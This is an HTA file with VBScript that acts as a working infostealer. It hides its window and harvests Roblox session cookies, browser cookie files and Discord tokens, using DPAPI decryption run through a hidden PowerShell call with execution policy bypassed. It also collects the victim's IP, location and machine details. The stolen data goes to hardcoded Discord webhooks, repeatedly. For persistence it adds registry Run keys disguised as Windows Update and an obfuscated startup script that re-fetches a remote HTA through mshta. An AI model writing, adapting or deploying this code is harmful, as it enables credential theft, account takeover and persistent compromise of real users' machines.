<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH_ALL, WH_REGRAB, PAYLOAD_URL, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- WEBHOOKS & PAYLOAD URL ---
WH_ALL = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
WH_REGRAB = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6MLG5cMr3bQrJCQhGVAqmKuBiWhekJTWAXERsrHl7Y0VUmU1scadn"

PAYLOAD_URL = "mshta https://dicerigx.app/"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' --- Initial Grab (All Logs) ---
Call IP(True)
Call GrabRoblox(True)
Call GrabTokens(True)
Call Persistence(True)

' --- Re-run grab chain 4x (every 5 min) (Re-Grab only) ---
Dim runCount
For runCount = 1 To 4
    Call PostEmbedTo(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, WH_REGRAB)
    Call IP(False)
    Call GrabRoblox(False)
    Call GrabTokens(False)
    If runCount < 4 Then Call SleepMinutes(5)
Next

' --- KILL SELF (Removed the fast kill, let it close naturally) ---
window.close()

' --- IP Function ---
Sub IP(isFirstGrab)
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
    Call RouteMessage(":dart: Target Info", info, 3447003, isFirstGrab)
    Set xh = Nothing
End Sub

' --- GrabRoblox Function ---
Sub GrabRoblox(isFirstGrab)
    Dim paths(7)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    paths(5) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default\Network\Cookies"
    paths(6) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Edge\User Data\Default\Network\Cookies"
    
    Dim i, fp, raw
    For i = 0 To 6
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
    Next
    
    If Len(fp) = 0 Then Exit Sub
    
    ' Read as binary to get proper hex bytes
    Dim stream: Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.LoadFromFile fp
    raw = stream.Read
    stream.Close
    Set stream = Nothing

    ' Convert binary to string for searching
    Dim strRaw: strRaw = ""
    Dim j
    For j = 1 To LenB(raw)
        strRaw = strRaw & Chr(AscB(MidB(raw, j, 1)))
    Next

    Dim cookie: cookie = ""
    Dim sp: sp = InStr(strRaw, "_|WARNING")
    If sp > 0 Then
        cookie = Mid(strRaw, sp)
    Else
        Dim cp: cp = InStr(strRaw, "CookiesData")
        If cp > 0 Then
            Dim eqp: eqp = InStr(cp, strRaw, ":")
            If eqp > 0 Then
                Dim qp1: qp1 = InStr(eqp, strRaw, """")
                If qp1 > 0 Then
                    Dim qp2: qp2 = InStr(qp1 + 1, strRaw, """")
                    If qp2 > qp1 Then
                        Dim b64: b64 = Mid(strRaw, qp1 + 1, qp2 - qp1 - 1)
                        If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
                    End If
                End If
            End If
        End If
    End If

    If Len(cookie) = 0 Then cookie = strRaw

    cookie = Replace(cookie, vbCr, "")
    cookie = Replace(cookie, vbLf, "")
    cookie = Replace(cookie, vbTab, "")
    cookie = Trim(cookie)
    
    Dim sc: sc = InStr(cookie, ";")
    If sc > 0 Then cookie = Left(cookie, sc - 1)
    cookie = Trim(cookie)

    ' Ensure it starts with _|WARNING
    If InStr(cookie, "_|WARNING") = 0 Then
        cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" & cookie
    End If

    If Len(cookie) > 50 Then
        Call RouteMessage(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, isFirstGrab)
        Call RouteFile("cookie.txt", cookie, isFirstGrab)
    End If
End Sub

' --- DecryptDPAPI ---
Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    On Error Resume Next
    Dim inf: inf = TmpFile("dpi.txt")
    Dim outf: outf = TmpFile("dpo.txt")
    fso.DeleteFile outf, True
    WriteFile inf, b64
    
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = TmpFile("dpapi.ps1")
    WriteFile psf, ps
    
    ' Increased wait to ensure PowerShell finishes DPAPI before killing
    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    
    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
End Function

' --- Sleep Functions ---
Sub SleepSeconds(s)
    Dim t0, t1, t2, elapsed
    t0 = Timer()
    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
    sh.Run cmd, 0, True
    elapsed = Timer() - t0
    If elapsed < 0 Then elapsed = elapsed + 86400
    If elapsed < s Then
        t1 = Timer()
        Do
            t2 = Timer()
            If t2 < t1 Then t2 = t2 + 86400
            If (t2 - t1) >= (s - elapsed) Then Exit Do
        Loop
    End If
End Sub

Sub SleepMinutes(m)
    Call SleepSeconds(m * 60)
End Sub

' --- Persistence ---
Sub Persistence(isFirstGrab)
    On Error Resume Next
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", PAYLOAD_URL, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", PAYLOAD_URL, "REG_SZ"

    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & PAYLOAD_URL & """&Chr(34), 0, False"
    sf.Close

    Call RouteMessage(":pushpin: Persistence", "Startup installed to boot HTA", 65280, isFirstGrab)
End Sub

' --- GrabTokens (Native LevelDB Extraction) ---
Sub GrabTokens(isFirstGrab)
    Dim basePaths(3)
    basePaths(0) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\discord"
    basePaths(1) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\discordcanary"
    basePaths(2) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\discordptb"
    basePaths(3) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default"

    Dim i
    For i = 0 To 3
        Dim ldbPath: ldbPath = basePaths(i) & "\Local Storage\leveldb"
        If fso.FolderExists(ldbPath) Then
            Dim files, f
            Set files = fso.GetFolder(ldbPath).Files
            For Each f In files
                If Right(f.Name, 4) = ".ldb" Or Right(f.Name, 3) = ".log" Then
                    Dim raw: raw = ReadFile(f.Path)
                    If InStr(raw, "dQw4w9WgXcQ:") > 0 Then
                        Dim chunks: chunks = Split(raw, vbLf)
                        Dim line
                        For Each line In chunks
                            If InStr(line, "dQw4w9WgXcQ:") > 0 Then
                                Dim token: token = ExtractToken(line)
                                If Len(token) > 50 Then
                                    Dim info: info = "**Token found**" & vbCrLf & token
                                    Call RouteMessage(":gift: Discord Token", info, 5793266, isFirstGrab)
                                    Call RouteFile("discord_token.txt", token, isFirstGrab)
                                End If
                            End If
                        Next
                    End If
                End If
            Next
        End If
    Next
End Sub

Function ExtractToken(s)
    ExtractToken = ""
    Dim p: p = InStr(s, "dQw4w9WgXcQ:")
    If p > 0 Then
        p = p + 12
        Dim ep: ep = InStr(p, s, """")
        If ep > p Then
            Dim b64: b64 = Mid(s, p, ep - p)
            ExtractToken = DecryptDPAPI(b64)
        End If
    End If
End Function

' --- Routing ---
Sub RouteMessage(t, d, c, isFirstGrab)
    If isFirstGrab Then
        Call PostEmbedTo(t, d, c, WH_ALL)
    Else
        Call PostEmbedTo(t, d, c, WH_REGRAB)
    End If
End Sub

Sub RouteFile(fn, ct, isFirstGrab)
    If isFirstGrab Then
        Call PostFileTo(fn, ct, WH_ALL)
    Else
        Call PostFileTo(fn, ct, WH_REGRAB)
    End If
End Sub

' --- Utility Functions ---
Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function

' --- PostEmbedTo ---
Sub PostEmbedTo(t, d, c, target_wh)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", target_wh, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

' --- PostFileTo ---
Sub PostFileTo(fn, ct, target_wh)
    Dim DQ: DQ = Chr(34)
    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", target_wh, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

' --- Ej ---
Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr, Chr(92) & "n")
    Ej = Replace(Ej, vbLf, Chr(92) & "n")
    Ej = Replace(Ej, vbTab, Chr(92) & "t")
End Function
